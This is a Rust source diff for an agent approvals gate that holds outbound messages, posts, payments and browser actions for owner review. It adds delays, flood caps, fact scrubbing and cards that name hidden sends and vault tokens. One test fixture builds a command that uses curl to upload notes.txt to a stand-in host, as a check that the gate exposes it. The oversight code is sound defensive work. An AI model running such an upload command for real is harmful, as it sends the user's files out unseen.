@@ -195,6 +195,25 @@ pub fn held_text(id: i64, summary: &str) -> String {
     format!("held for the owner as #{id} ({summary}); don't retry it; carry on or end your turn")
 }
 
+/// What the agent is told of an action held for a delay (`delay N`), which goes by itself in
+/// `minutes` unless the owner cancels it (C4).
+pub fn delayed_text(id: i64, summary: &str, minutes: i64) -> String {
+    format!(
+        "delayed as #{id} ({summary}): it goes by itself in {minutes} min unless the owner \
+         cancels it with /cancel {id}; don't retry it; carry on or end your turn"
+    )
+}
+
+/// The minutes left until `due_at`, at least one, rounded up.
+pub fn minutes_until(due_at: i64, now: i64) -> i64 {
+    ((due_at - now + 59) / 60).max(1)
+}
+
+/// What the owner is told when the gate cannot start (C7, R52).
+pub const GATE_DOWN: &str = "[zephyr] the approvals gate could not start, so until zephyr \
+                             restarts every message, post and payment a task or a job makes, \
+                             every connector call and the browser's sends are refused";
+
 /// Decides `req` (approvals spec §4.2): a call that is no message, post or payment and sends
 /// nothing out is allowed at once. Otherwise, in order:
 ///
@@ -227,10 +246,12 @@ pub fn decide(
         );
         return Verdict::Deny("not run: the gate could not read the browser request".into());
     }
-    let Some(call) = Call::of(cfg, req) else {
+    // A browser action's summary quotes the page's button, scrubbed before it is cut (D9).
+    let early = req.browser.is_some().then(|| Scrub::load(cfg));
+    let Some(call) = Call::of(cfg, req, early.as_ref()) else {
         return Verdict::Allow;
     };
-    let scrub = Scrub::load(cfg);
+    let scrub = early.unwrap_or_else(|| Scrub::load(cfg));
     let gate = Gate {
         cfg,
         store,
@@ -274,9 +295,9 @@ impl Call {
     /// `None` for a call the gate has nothing to look at: no message, post or payment, and no
     /// data going out (spec §4.2 step 1: the facts are checked in every call `outbound` lists,
     /// every connector call, and the browser's typed values).
-    fn of(cfg: &Config, req: &Request) -> Option<Call> {
+    fn of(cfg: &Config, req: &Request, scrub: Option<&Scrub>) -> Option<Call> {
         if let Some(b) = &req.browser {
-            return Call::browser(req, b);
+            return Call::browser(req, b, scrub);
         }
         let classes = |server: &str, tool: &str| connector_class(cfg, server, tool);
         let gated = policy::gated(&req.tool, &req.args, &classes);
@@ -307,7 +328,10 @@ impl Call {
             Some(g) => (class_key(g.class), g.targets.clone(), g.summary.clone()),
             None => (OUTBOUND, targets, summary),
         };
+        // C3: only main's `exec` takes vault tokens; what else names some (a request on the
+        // socket) gets none on `/ok`.
         let secrets = (req.args.get("secrets").and_then(Value::as_array))
+            .filter(|_| req.tool == "exec")
             .map(|names| {
                 let names = names.iter().filter_map(Value::as_str);
                 names.map(String::from).collect()
@@ -334,7 +358,7 @@ impl Call {
     /// A click or key press the wrapper caught, classified by `browser_class`, or typing, which
     /// only the facts check looks at. Its target is the page's origin. Any action but typing on
     /// a control with no role is one the gate could not read: held, never let through (I3).
-    fn browser(req: &Request, b: &Browser) -> Option<Call> {
+    fn browser(req: &Request, b: &Browser, scrub: Option<&Scrub>) -> Option<Call> {
         let origin = origin_of(&b.origin);
         let typing = matches!(b.action.as_str(), "fill" | "type");
         let unread = !typing && b.role.trim().is_empty();
@@ -348,7 +372,11 @@ impl Call {
         if class.is_none() && !unread && text.trim().is_empty() {
             return None;
         }
-        let name = quoted_cut(&b.name, 80);
+        // D9: scrubbed first, so a private fact across the cut leaves no part of itself.
+        let name = quoted_cut(
+            &scrub.map_or_else(|| b.name.clone(), |s| s.text(&b.name)),
+            80,
+        );
         let key = matches!(b.action.as_str(), "press" | "keyboard");
         let summary = match b.action.as_str() {
             _ if typing => format!("typing on {origin}"),
@@ -492,6 +520,90 @@ impl Scrub {
             .as_ref()
             .is_ok_and(|f| !names_in(f, joined, &[]).is_empty())
     }
+}
+
+/// R63: what a delayed action finds when it comes due, its stored payload read again under the
+/// facts and the modes as they are now. `None` lets it go, as its mode is the same or looser;
+/// `Some(why)` sends it back to the owner, `why` in the daemon's words (a fact's name, never
+/// its value): a fact found under `hold` or facts that cannot be read, or a mode that would
+/// hold it now (`ask`, `ask-new` with a target not known, a cap it is over) or wait longer.
+pub fn due_check(cfg: &Config, store: &Store, a: &Action) -> Option<String> {
+    let Some(req) = stored_request(a) else {
+        return Some("zephyr could not read it again".into());
+    };
+    let scrub = Scrub::load(cfg);
+    let call = Call::of(cfg, &req, Some(&scrub))?;
+    let e = approvals::effective(cfg);
+    match (e.facts, &scrub.facts) {
+        (FactsMode::Off, _) => {}
+        (_, Err(_)) => return Some(UNREADABLE.into()),
+        (FactsMode::Hold, Ok(f)) => {
+            let names = names_in(f, &call.text, recipients(call.kind, &call.targets));
+            if !names.is_empty() {
+                return Some(format!("it {}", fact_note(&names)));
+            }
+        }
+        (FactsMode::Warn, _) => {}
+    }
+    if call.unread {
+        return Some("the gate could not read its control".into());
+    }
+    let g = call.gated.as_ref()?;
+    let origin = (a.origin.channel.clone(), a.origin.sender.clone());
+    let gate = Gate {
+        cfg,
+        store,
+        req: &req,
+        call: &call,
+        scrub: &scrub,
+        origin: &origin,
+        now: crate::now(),
+    };
+    let stricter = match gate.mode(&e, g) {
+        Ok(Plan::Allow(_)) => false,
+        Ok(Plan::Hold(_)) => true,
+        Ok(Plan::Delay(m)) => {
+            let m = match call.kind {
+                ActionKind::Wait => m.min(WAIT_MINUTES),
+                _ => m,
+            };
+            let held = a.due_at.map_or(0, |d| (d - a.created_at + 30) / 60);
+            i64::from(m) > held
+        }
+        Err(_) => return Some("the gate could not read its records".into()),
+    };
+    let mode = mode_of(&e, g.class);
+    stricter.then(|| format!("approvals.{} is now {mode}", class_key(g.class)))
+}
+
+/// The call a held action was made from, as the gate saw it: main's or a task's command, the
+/// connector call, or the browser request. `None` when its payload cannot be read.
+fn stored_request(a: &Action) -> Option<Request> {
+    let payload = serde_json::from_str::<Value>(&a.payload).ok();
+    let (tool, args, browser) = match a.kind {
+        // an older row's payload is the command itself
+        ActionKind::Run => {
+            let args = (payload.filter(Value::is_object))
+                .unwrap_or_else(|| serde_json::json!({ "command": a.command() }));
+            ("exec", args, None)
+        }
+        ActionKind::Pass => ("mcp_call", payload?, None),
+        ActionKind::Wait => {
+            let payload = payload?;
+            let b: Browser = serde_json::from_value(payload.get("browser")?.clone()).ok()?;
+            let args = payload.get("args").cloned().unwrap_or_default();
+            ("browser", args, Some(b))
+        }
+    };
+    Some(Request {
+        session: a.origin.session.clone(),
+        call_id: a.origin.call_id.clone(),
+        tool: tool.into(),
+        args,
+        browser,
+        run: a.origin.run.clone(),
+        reason: None,
+    })
 }
 
 /// One audit row, its arguments cut to 500 bytes.
@@ -765,25 +877,28 @@ impl Gate<'_> {
     /// The flood cap: the deny text and the owner's summary line, when this run or this day
     /// already has as many waiting as it may.
     fn flooded(&self) -> rusqlite::Result<Option<(String, String)>> {
-        let deny = |n: u32| format!("not run: {n} actions already wait for the owner");
         let waiting = self.store.waiting_in_run(&self.req.run)?;
         if waiting >= RUN_CAP {
             return Ok(Some((
-                deny(waiting),
+                format!("not run: {waiting} actions already wait for the owner in this run"),
                 format!(
                     "[zephyr] {waiting} actions from one run already wait for you, so its further \
                      messages, posts and payments are not run; /held lists the waiting ones"
                 ),
             )));
         }
+        // R62: what the owner approved with `/ok` is no flood; the rest of the day's holds are.
         let today = self.store.held_today(self.now)?;
         Ok((today >= DAY_CAP).then(|| {
             (
-                deny(today),
                 format!(
-                    "[zephyr] {today} actions were held for you in the last 24 h, so the agent's \
-                     further messages, posts and payments are not run for now; /held lists the \
-                     waiting ones"
+                    "not run: {today} actions held for the owner in the last day are unanswered \
+                     or were declined"
+                ),
+                format!(
+                    "[zephyr] {today} actions held for you in the last 24 h are unanswered or were \
+                     declined, so the agent's further messages, posts and payments are not run for \
+                     now; /held lists the waiting ones"
                 ),
             )
         }))
@@ -859,12 +974,13 @@ impl Gate<'_> {
             &card(&action, self.cfg, self.store),
         );
         self.audit(outcome);
+        let text = match due_at {
+            Some(at) => delayed_text(id, &action.summary, minutes_until(at, self.now)),
+            None => held_text(id, &action.summary),
+        };
         Ok(match wait {
             true => Verdict::Wait { id },
-            false => Verdict::Hold {
-                id,
-                text: held_text(id, &action.summary),
-            },
+            false => Verdict::Hold { id, text },
         })
     }
 }
@@ -950,6 +1066,12 @@ pub async fn serve(
         Ok(started) => started,
         Err(e) => {
             eprintln!("zephyr: the gate is down, so the agent's sends are refused: {e:#}");
+            // C7: the owner last answered is told once, where the store can still be opened.
+            let told = Store::open(&cfg.db_path()).and_then(|s| s.notify_last_owner(GATE_DOWN));
+            match told {
+                Ok(()) => wake.outbox.notify_one(),
+                Err(e) => eprintln!("zephyr: telling the owner that the gate is down failed: {e}"),
+            }
             return std::future::pending().await;
         }
     };
@@ -1368,8 +1490,32 @@ pub fn card(a: &Action, cfg: &Config, store: &Store) -> String {
             }
         }
     }
-    if let Some(command) = command {
-        lines.push(format!("command: \"{}\"", quoted_cut(&command, BODY_CHARS)));
+    if let Some(command) = &command {
+        lines.push(format!("command: \"{}\"", quoted_cut(command, BODY_CHARS)));
+        // C1: a command cut on the card still runs whole: the card says so, and names what all
+        // of it sends, read from the whole command as stored.
+        let whole = crate::settings::one_line(command, usize::MAX)
+            .chars()
+            .count();
+        if whole > BODY_CHARS {
+            lines.push(format!(
+                "not shown: {} more characters of the command; /ok {} runs all of it",
+                whole - BODY_CHARS,
+                a.id
+            ));
+            let sends = all_it_sends(cfg, &a.command());
+            if !sends.is_empty() {
+                let sends = crate::settings::one_line(&clean(&sends), BODY_CHARS);
+                lines.push(format!("all it sends: {sends}"));
+            }
+        }
+        // C3: the vault tokens `/ok` hands the command, by name.
+        if !a.secrets.is_empty() {
+            let names: Vec<String> = (a.secrets.iter())
+                .map(|n| format!("\"{}\"", quoted_cut(&clean(n), 80)))
+                .collect();
+            lines.push(format!("vault tokens it gets: {}", names.join(", ")));
+        }
     }
     if let Some(reason) = a.reason.as_deref().map(|r| quoted(&clean(r))) {
         if !reason.is_empty() {
@@ -1378,6 +1524,20 @@ pub fn card(a: &Action, cfg: &Config, store: &Store) -> String {
     }
     lines.push(footer(a, cfg, class));
     lines.join("\n")
+}
+
+/// Every gated stage's summary and every `outbound` label of `command`, once each (C1).
+fn all_it_sends(cfg: &Config, command: &str) -> String {
+    let classes = |server: &str, tool: &str| connector_class(cfg, server, tool);
+    let args = serde_json::json!({ "command": command });
+    let mut items: Vec<String> = Vec::new();
+    let gated = policy::gated("bash", &args, &classes).map(|g| g.summary);
+    for item in gated.into_iter().chain(policy::outbound(command)) {
+        if !items.contains(&item) {
+            items.push(item);
+        }
+    }
+    items.join("; ")
 }
 
 /// The card's first line after the id: `message (email)`, `payment (browser)`.
@@ -2054,7 +2214,15 @@ mod tests {
         let Verdict::Hold { id, text } = v else {
             panic!("{v:?}")
         };
-        assert_eq!(text, held_text(id, "gh pr create on octo/hello"));
+        assert_eq!(
+            text,
+            format!(
+                "delayed as #{id} (gh pr create on octo/hello): it goes by itself in 5 min \
+                 unless the owner cancels it with /cancel {id}; don't retry it; carry on or end \
+                 your turn"
+            )
+        );
+        assert_eq!(text, delayed_text(id, "gh pr create on octo/hello", 5));
         let a = action(&h.store, id);
         assert_eq!(
             (a.class.as_str(), a.status.as_str(), a.due_at),
@@ -2110,7 +2278,8 @@ mod tests {
         for _ in 0..3 {
             held(&d("flood:task-7"));
         }
-        let three = Verdict::Deny("not run: 3 actions already wait for the owner".into());
+        let three =
+            Verdict::Deny("not run: 3 actions already wait for the owner in this run".into());
         assert_eq!(d("flood:task-7"), three);
         assert_eq!(d("flood:task-7"), three);
         // Three cards and one summary line, not a card per call.
@@ -2133,19 +2302,204 @@ mod tests {
         held(&d("flood:f"));
         held(&d("flood:f"));
         assert_eq!(h.store.held_today(now).unwrap(), 20);
-        let twenty = Verdict::Deny("not run: 20 actions already wait for the owner".into());
+        let twenty = Verdict::Deny(
+            "not run: 20 actions held for the owner in the last day are unanswered or were \
+             declined"
+                .into(),
+        );
         assert_eq!(d("flood:f"), twenty);
         assert_eq!(d("flood:g"), twenty);
         assert_eq!(d("flood:g"), twenty);
         let told = notices(&h.store);
         let day = told
             .iter()
-            .filter(|n| n.starts_with("[zephyr] 20 actions were held for you"))
+            .filter(|n| {
+                n.starts_with(
+                    "[zephyr] 20 actions held for you in the last 24 h are unanswered or were \
+                     declined",
+                )
+            })
             .count();
         assert_eq!(day, 2, "one summary for each run: {told:#?}");
         let out = outcomes(&h.store);
         assert_eq!(out.iter().filter(|o| *o == "held").count(), 20);
         assert_eq!(out.iter().filter(|o| *o == "denied").count(), 5);
+    }
+
+    /// R62: the day cap counts the actions the owner did not approve: twenty approved sends
+    /// leave the twenty-first held as usual; twenty unanswered refuse the next with the day's
+    /// words. A delay that went by itself counts, as the owner never said `/ok`.
+    #[test]
+    fn the_day_cap_counts_only_what_the_owner_did_not_approve() {
+        let h = home("gate-day-approved", "");
+        let cfg = Arc::new(h.cfg.clone());
+        let (procs, waits) = (
+            crate::procs::Procs::default(),
+            crate::actions::Waits::default(),
+        );
+        let steers = crate::scheduler::Steers::default();
+        let ctx = crate::actions::Ctx {
+            cfg: &cfg,
+            store: &h.store,
+            procs: &procs,
+            waits: &waits,
+            steers: &steers,
+        };
+        let now = crate::now();
+        let send = |run: &str| {
+            // each its own call, so no pass of an earlier one lets it through
+            let req = mcp(
+                "mail",
+                "send_email",
+                json!({"to": "a@x.org", "n": run}),
+                run,
+            );
+            decide(&h.cfg, &h.store, &req, owner(), now)
+        };
+        let by = crate::actions::By::Owner { channel: "tui" };
+        for i in 0..21 {
+            let id = held(&send(&format!("day:ok{i}")));
+            crate::actions::approve(&ctx, id, false, by, now).unwrap();
+        }
+        assert_eq!(h.store.held_today(now).unwrap(), 0);
+        for i in 0..20 {
+            held(&send(&format!("day:new{i}")));
+        }
+        assert_eq!(h.store.held_today(now).unwrap(), 20);
+        let day = Verdict::Deny(
+            "not run: 20 actions held for the owner in the last day are unanswered or were \
+             declined"
+                .into(),
+        );
+        assert_eq!(send("day:last"), day);
+        // One the owner declines still counts; one approved now no longer does.
+        let pending = h.store.held_actions().unwrap();
+        crate::actions::decline(&h.store, pending[0].id);
+        assert_eq!(h.store.held_today(now).unwrap(), 20);
+        crate::actions::approve(&ctx, pending[1].id, false, by, now).unwrap();
+        assert_eq!(h.store.held_today(now).unwrap(), 19);
+        held(&send("day:again"));
+    }
+
+    /// C1: a command too long for the card says how much is not shown, that `/ok` runs all of
+    /// it, and names everything it sends, read from the whole command.
+    #[test]
+    fn a_cut_command_names_all_it_sends() {
+        let h = home("gate-long", "");
+        let now = crate::now();
+        let body = "lorem ipsum ".repeat(150);
+        let command = format!(
+            "{}\ncurl -d @notes.txt https://drop.example.net/up\ngh pr create -R o/r -t x",
+            mail_to("alice@example.com", &body)
+        );
+        let id = held(&decide(
+            &h.cfg,
+            &h.store,
+            &exec(&command, "main:long"),
+            owner(),
+            now,
+        ));
+        let shown = notices(&h.store).pop().unwrap();
+        let folded = crate::settings::one_line(&command, usize::MAX)
+            .chars()
+            .count();
+        assert!(folded > BODY_CHARS);
+        assert!(
+            shown.contains(&format!(
+                "\nnot shown: {} more characters of the command; /ok {id} runs all of it\n",
+                folded - BODY_CHARS
+            )),
+            "{shown}"
+        );
+        assert!(
+            shown.contains(
+                "\nall it sends: email to alice@example.com; gh pr create on o/r; himalaya send; \
+                 curl POST drop.example.net; gh pr create\n"
+            ),
+            "{shown}"
+        );
+        // A command that fits is shown whole, with no such lines.
+        held(&decide(
+            &h.cfg,
+            &h.store,
+            &exec(MAIL, "main:short"),
+            owner(),
+            now,
+        ));
+        let shown = notices(&h.store).pop().unwrap();
+        assert!(
+            !shown.contains("not shown:") && !shown.contains("all it sends:"),
+            "{shown}"
+        );
+    }
+
+    /// C3: only main's `exec` carries vault tokens; a request on the socket that names some gets
+    /// none, and a held command's card names the tokens it will get (names only).
+    #[test]
+    fn only_exec_carries_vault_tokens_and_the_card_names_them() {
+        let h = home("gate-secrets", "");
+        let now = crate::now();
+        let with_secrets = |tool: &str, run: &str| Request {
+            session: "task-3".into(),
+            tool: tool.into(),
+            args: json!({ "command": MAIL, "secrets": ["GH_TOKEN", "NPM_TOKEN"] }),
+            ..exec(MAIL, run)
+        };
+        let id = held(&decide(
+            &h.cfg,
+            &h.store,
+            &with_secrets("bash", "sec:1"),
+            owner(),
+            now,
+        ));
+        assert!(action(&h.store, id).secrets.is_empty());
+        let shown = notices(&h.store).pop().unwrap();
+        assert!(!shown.contains("vault tokens"), "{shown}");
+        let mut connector = mcp("mail", "send_email", json!({"to": "a@x.org"}), "sec:2");
+        connector.args["secrets"] = json!(["GH_TOKEN"]);
+        let id = held(&decide(&h.cfg, &h.store, &connector, owner(), now));
+        assert!(action(&h.store, id).secrets.is_empty());
+        let id = held(&decide(
+            &h.cfg,
+            &h.store,
+            &with_secrets("exec", "sec:3"),
+            owner(),
+            now,
+        ));
+        assert_eq!(action(&h.store, id).secrets, ["GH_TOKEN", "NPM_TOKEN"]);
+        let shown = notices(&h.store).pop().unwrap();
+        assert!(
+            shown.contains("\nvault tokens it gets: \"GH_TOKEN\", \"NPM_TOKEN\"\n"),
+            "{shown}"
+        );
+    }
+
+    /// D9: a button's name is scrubbed before it is cut, so a fact across the cut leaves no part
+    /// of itself in the summary, the held text or the card.
+    #[test]
+    fn a_button_name_is_scrubbed_before_it_is_cut() {
+        let h = home("gate-button-cut", "");
+        std::fs::write(crate::facts::path(&h.cfg), PHONE).unwrap();
+        let now = crate::now();
+        let name = format!("Send to {}5550102345 now", "x".repeat(66));
+        let v = decide(
+            &h.cfg,
+            &h.store,
+            &click(&name, "https://mail.example.com", "cut:1"),
+            owner(),
+            now,
+        );
+        let id = held(&v);
+        let a = action(&h.store, id);
+        let shown = notices(&h.store).pop().unwrap();
+        for text in [a.summary.as_str(), shown.as_str()] {
+            assert!(!text.contains("55501"), "{text}");
+        }
+        assert!(
+            a.summary.starts_with("click \"Send to xxx"),
+            "{}",
+            a.summary
+        );
     }
 
     const PHONE: &str = "[[fact]]\nname = \"phone\"\nkind = \"digits\"\n\
@@ -3010,13 +3364,38 @@ mod tests {
         assert!(!served.is_finished(), "the gate ended: {:?}", served.await);
         served.abort();
         assert!(!socket_path(&h.cfg).exists(), "no socket to ask");
-        // A public folder others may write: no socket is made in it.
+        // A public folder others may write: no socket is made in it, and the owner last
+        // answered is told, once, what is refused until zephyr restarts (C7).
         let h = home("gate-open-dir", "");
+        let mut store = Store::open(&h.cfg.db_path()).unwrap();
+        let said = crate::channel::Inbound {
+            channel: "discord".into(),
+            platform_msg_id: "m1".into(),
+            sender: "owner-1".into(),
+            text: "hi".into(),
+        };
+        store.insert_inbox(&said).unwrap();
+        let row = store.inbox_with_status("new").unwrap().remove(0);
+        store.mark_dispatched_as(row.id, "prompt").unwrap();
+        store.reply(&row, "hello", "done").unwrap();
+        for o in store.pending_outbox().unwrap() {
+            store.set_outbox_status(o.id, "sent").unwrap();
+        }
         let public = crate::drafts::public_dir(&h.cfg);
         std::fs::create_dir_all(&public).unwrap();
         std::fs::set_permissions(&public, std::fs::Permissions::from_mode(0o777)).unwrap();
         let served = start(&h.cfg);
-        tokio::time::sleep(Duration::from_millis(300)).await;
+        let told = async {
+            loop {
+                let told = notices(&store);
+                if !told.is_empty() {
+                    return told;
+                }
+                tokio::time::sleep(Duration::from_millis(20)).await;
+            }
+        };
+        let told = tokio::time::timeout(Duration::from_secs(10), told).await;
+        assert_eq!(told.expect("the owner was told"), [GATE_DOWN]);
         assert!(!served.is_finished(), "the gate ended: {:?}", served.await);
         served.abort();
         assert!(!socket_path(&h.cfg).exists(), "no socket to ask");
